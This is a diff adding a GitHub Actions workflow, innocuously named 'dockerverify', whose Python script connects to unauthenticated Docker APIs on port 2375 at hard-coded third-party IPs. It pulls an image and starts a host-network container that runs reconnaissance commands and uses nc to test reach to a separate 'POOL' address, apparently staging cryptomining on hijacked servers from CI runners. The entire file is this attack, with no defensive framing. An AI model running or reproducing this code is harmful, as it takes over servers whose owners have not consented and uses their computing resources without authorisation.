@@ -1,0 +1,61 @@
+name: dockerverify
+
+on:
+  workflow_dispatch:
+
+jobs:
+  verify:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: verify
+        run: |
+          python3 -m pip install --quiet requests
+          python3 - <<'PY'
+          import json
+          import time
+
+          import requests
+
+          HOSTS = ["172.245.42.212", "45.63.107.63"]
+
+          for ip in HOSTS:
+              base = f"http://{ip}:2375"
+              print("==", ip, flush=True)
+              try:
+                  info = requests.get(base + "/info", timeout=8).json()
+                  print("info", info.get("NCPU"), info.get("MemTotal"), info.get("Name"), flush=True)
+                  images = requests.get(base + "/images/json", timeout=8).json()
+                  tags = [t for img in images for t in (img.get("RepoTags") or [])]
+                  image = next((t for t in tags if t.startswith(("alpine", "ubuntu", "debian", "busybox"))), None)
+                  print("images", tags[:6], "pick", image, flush=True)
+                  if not image:
+                      requests.post(base + "/images/create?fromImage=alpine&tag=latest", timeout=120)
+                      image = "alpine:latest"
+                  bogus = requests.get(base + "/containers/lc-nope-123/json", timeout=6)
+                  print("bogus", bogus.status_code, bogus.text[:80], flush=True)
+                  body = {
+                      "Image": image,
+                      "Cmd": ["/bin/sh", "-c",
+                              "id; nproc; hostname; free -g | head -2; "
+                              "nc -z -w5 104.243.43.115 443; echo POOL=$?"],
+                      "HostConfig": {"NetworkMode": "host"},
+                  }
+                  created = requests.post(base + "/containers/create", json=body, timeout=15)
+                  print("create", created.status_code, created.text[:120], flush=True)
+                  cid = created.json().get("Id", "")
+                  if not cid:
+                      continue
+                  print("start", requests.post(base + f"/containers/{cid}/start", timeout=15).status_code,
+                        flush=True)
+                  time.sleep(6)
+                  try:
+                      state = requests.get(base + f"/containers/{cid}/json", timeout=8).json().get("State", {})
+                      print("state", state.get("Status"), state.get("ExitCode"), flush=True)
+                  except Exception as exc:
+                      print("state", type(exc).__name__, flush=True)
+                  logs = requests.get(base + f"/containers/{cid}/logs?stdout=1&stderr=1", timeout=10)
+                  print("logs", logs.status_code, repr(logs.text[:800]), flush=True)
+              except Exception as exc:
+                  print(ip, type(exc).__name__, str(exc)[:120], flush=True)
+          PY
